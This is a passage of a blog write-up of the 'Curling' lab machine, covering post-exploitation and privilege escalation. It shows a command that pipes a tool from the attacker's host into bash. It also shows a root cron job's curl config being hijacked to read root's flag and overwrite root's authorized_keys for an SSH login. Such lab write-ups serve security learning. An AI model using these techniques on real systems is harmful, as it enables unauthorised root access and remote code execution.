0d912036************************</span></span></span></code></pre><div id="https://www.notion.so/722298b491b9426a8dddcfe91d986dfe" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/c6df499b1b7c4e96be22a949ec7cbd0f" class="Divider"></div><h3 id="https://www.notion.so/ec64e760c89c4c72a4898505b6118963" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/ec64e760c89c4c72a4898505b6118963"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">floris</code></span><span class="SemanticString">:</span></span></h3><h3 id="https://www.notion.so/0405fa09d71d42f5a4da39b37a5265d4" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/0405fa09d71d42f5a4da39b37a5265d4"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">admin-area</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/339faf7c533540258f2679bbabd02c5e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">As </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">floris</code></span><span class="SemanticString">, I can now access </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/admin-area</code></span><span class="SemanticString">, which only contains two files, both writable and owned by root.</span></span></p></div><pre id="https://www.notion.so/aa5a2b24278344348f0c7d25e9d29e38" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>floris@curling:~/admin-area$</span></mark></span><span class="SemanticString"><span> ls -la

total 28
drwxr-x--- 2 root   floris  4096 Aug  2  2022 .
drwxr-xr-x 6 floris floris  4096 Feb  6 14:10 ..
-rw-rw---- 1 root   floris    25 Feb  6 14:23 input
-rw-rw---- 1 root   floris 14236 Feb  6 14:23 report</span></span></span></code></pre><div id="https://www.notion.so/83e93d494202443aad8004409301d2de" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">input</code></span><span class="SemanticString"> contains a localhost URL, while </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">report</code></span><span class="SemanticString"> seems to be the HTML source of the web app. If you run </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">stat</code></span><span class="SemanticString"> on them, you’ll discover that both files are being constantly updated. This implies that there may be a cron job regularly writing into them.</span></span></p></div><div id="https://www.notion.so/894c58e97e774b968e27d6ee11c9147b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/home/floris/admin-area/input</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/b240ff770f9849fd8272da6803137380" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1"</span></span></span></span></code></pre><div id="https://www.notion.so/b4bbedafecb846ada529a20ecfa47a9c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/baa4ad1fa3604e3ca12f26642f3b7e54" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Process Spying:</strong></span></span></p></div><div id="https://www.notion.so/f5fe5819a69c4fb39bbf303bf443966b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll run </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/DominicBreuker/pspy">pspy</a></span><span class="SemanticString"> to detect any hidden cron jobs, and found this:</span></span></p></div><pre id="https://www.notion.so/fbf9b237dfa94ff69b27960ffe9e30eb" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>floris@curling:~$</span></mark></span><span class="SemanticString"><span> curl http://10.10.14.61:8000/pspy64 | bash

..SNIP..
2024/02/06 14:18:01 CMD: UID=0     PID=4696   | /usr/sbin/CRON -f 
2024/02/06 14:18:01 CMD: UID=0     PID=4701   | curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 
2024/02/06 14:19:01 CMD: UID=0     PID=4707   | curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 
2024/02/06 14:19:01 CMD: UID=0     PID=4706   | /usr/sbin/CRON -f
..SNIP..</span></span></span></code></pre><div id="https://www.notion.so/a75ab3b242804253b370e65e6aa36531" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">According to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">curl</code></span><span class="SemanticString">&#x27;s </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://curl.se/docs/manpage.html#-K">man page</a></span><span class="SemanticString">, the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">-K</code></span><span class="SemanticString"> option is to allow users to pass arguments via a config file instead of from the terminal.</span></span></p></div><pre id="https://www.notion.so/f866c251dfa2475ca4a038cdf4ba8375" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>floris@curling:~$</span></mark></span><span class="SemanticString"><span> curl --help all

Usage: curl [options...] &lt;url&gt;
     --abstract-unix-socket &lt;path&gt; Connect via abstract Unix domain socket
     --alt-svc &lt;file name&gt; Enable alt-svc with this cache file
     --anyauth     Pick any authentication method
 -a, --append      Append to target file when uploading
     --aws-sigv4 &lt;provider1[:provider2[:region[:service]]]&gt; Use AWS V4 signature authentication
     --basic       Use HTTP Basic Authentication
     --ca-native   Use CA certificates from the native OS
     --cacert &lt;file&gt; CA certificate to verify peer against
     --capath &lt;dir&gt; CA directory to verify peer against
 -E, --cert &lt;certificate[:password]&gt; Client certificate file and password
     --cert-status Verify the status of the server cert via OCSP-staple
     --cert-type &lt;type&gt; Certificate type (DER/PEM/ENG/P12)
     --ciphers &lt;list of ciphers&gt; SSL ciphers to use
     --compressed  Request compressed response
     --compressed-ssh Enable SSH compression
 -K, --config &lt;file&gt; Read config from a file
     --connect-timeout &lt;fractional seconds&gt; Maximum time allowed for connection
     --connect-to &lt;HOST1:PORT1:HOST2:PORT2&gt; Connect to host
 -C, --continue-at &lt;offset&gt; Resumed transfer offset

..SNIP..</span></span></span></code></pre><div id="https://www.notion.so/ebbefebfa8c9473289415d8213b0a81e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">In this cron’s case, it is running </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">curl</code></span><span class="SemanticString"> with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">input</code></span><span class="SemanticString"> as the config file, and saving the output into </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">report</code></span><span class="SemanticString">. Since we have write access to the config file, we can change the behavior of the command.</span></span></p></div><div id="https://www.notion.so/75d9284e492147c7bc281f0c1c0fcdfc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/74525a73edf6436d80e2d76808d12fe2" class="Divider"></div><h3 id="https://www.notion.so/ea57ab6ed6c04dcbac66c2032c9c1c80" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/ea57ab6ed6c04dcbac66c2032c9c1c80"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Privilege Escalation:</span></span></h3><div id="https://www.notion.so/44a7934073ad4e43a4ac3fc16e2ee96f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Curl Config Hijack:</strong></span></span></p></div><div id="https://www.notion.so/6b2b051f1e4d4f5687cc37249c36b1c5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Although less common, curl can actually be used for </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://everything.curl.dev/protocols/curl#file">other protocols</a></span><span class="SemanticString"> than HTTP, including </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">file://</code></span><span class="SemanticString">. I can simply update the config file to directly read the root flag, and its content would be copied into </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">report</code></span><span class="SemanticString"> when the cron runs.</span></span></p></div><pre id="https://www.notion.so/0e9c569d7ea34e7b958ec2e5cd889215" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>url <span class="token operator">=</span> <span class="token string">"file:///root/root.txt"</span></span></span></span></code></pre><div id="https://www.notion.so/d59c2ef17f9e4115a4e96695183df6db" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">But this would not return us a shell.</span></span></p></div><div id="https://www.notion.so/ce6700f72cde425f8c401ee0a8f7cd31" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I tried using the same trick to read root’s private key, but nothing happened, probably because it doesn’t exist.</span></span></p></div><div id="https://www.notion.so/03e4986a41a34455ab5114327c119797" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Alternatively, I can attempt the OG way of dropping a public key into root’s </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">authorized_keys</code></span><span class="SemanticString"> file. I first used </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ssh-keygen</code></span><span class="SemanticString"> to generate a key pair, and replaced </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">floris</code></span><span class="SemanticString"> with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">root</code></span><span class="SemanticString"> in the public key:</span></span></p></div><pre id="https://www.notion.so/47df85bdfdf7446b963822784b4f4094" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/0UISwVRMo+xFoDaITYOSSfs95nRO5YyZ0wV1XPxHyEcQ0XdDqL7jvvw1ARLF0cXCHDKLfntMFuucPRtVo5i8aNEKzAjn9jO3XS/TWPIRPQwUi3Y7QtdYvHIK8lN2Y9saMGu1EPflYbkGwc9R/yMQM9z9ChO/2SZPBYkoAqnzbPYVEJOAsWriaJbbKuiceAAwvOYUBYt1wq87FegYoO2EezTLh+Vqa69BkHZHRr6NOaVaoXybVBKsiq11bT3x9ZuBwcFeXkgwdIx3clqxky/vp/JCofCyP16PcmJOhW88+tN93kITkBoPszFGMIArXOonGqryFq1IyUcQHn+ujauZ root@curling</span></span></span></code></pre><div id="https://www.notion.so/78d253d8c7b34e30b01746ce713a12a1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Then I updated </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">input</code></span><span class="SemanticString"> such that it reads my generated public key and save it as root’s </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">authorized_keys</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/6778b1036d53456ba05f5dfe7757c254" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>url <span class="token operator">=</span> <span class="token string">"file:///home/floris/.ssh/id_rsa.pub"</span>
output <span class="token operator">=</span> <span class="token string">"/root/.ssh/authorized_keys"</span></span></span></span></code></pre><div id="https://www.notion.so/5f8e4d42e51f4add8ba3a9f0061e0956" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">After multiple attempts, I can SSH in as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">root</code></span><span class="SemanticString"> using the private key.</span></span></p></div><div id="https://www.notion.so/e33861d615f7440d8d0bd046687994ef" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F7b3b928f-7281-44e1-8657-94f67be52ba8%2FUntitled.png?width=1075&amp;table=block&amp;id=e33861d6-15f7-440d-8d0b-d046687994ef"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F7b3b928f-7281-44e1-8657-94f67be52ba8%2FUntitled.png?width=1075&amp;table=block&amp;id=e33861d6-15f7-440d-8d0b-d046687994ef" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><pre id="https://www.notion.so/646c0efa9fe144249d573921581ac625" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@curling:~#</span></mark></span><span class="SemanticString"><span> id

uid=0(root) gid=0(root) groups=0(root)</span></span></span></code></pre><div id="https://www.notion.so/95370380403243e784235b67452d900a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/3698bf200435478688d8b760f2261963" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Root Flag:</strong></span></span></p></div><pre id="https://www.notion.so/216b4f8d30ac47e2a9a8369cacb38ec1" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@curling:~#</span></mark></span><span class="SemanticString"><span> cat root.txt

a9abbedd************************</span></span></span></code></pre><div id="https://www.notion.so/7f8abf2117cd44eab59a8f3c91517504" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/3d214dcf57494df0b8be25c6b5a4e701" class="Divider"></div></article>
  <footer class="Footer">
  <div>&copy; C:\Users\ch3ng &gt;_ 2025</div>
  <div>&centerdot;</div>
  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
      rel="noopener noreferrer">Notablog</a>.
  </div>
</footer>

</body>

</html>
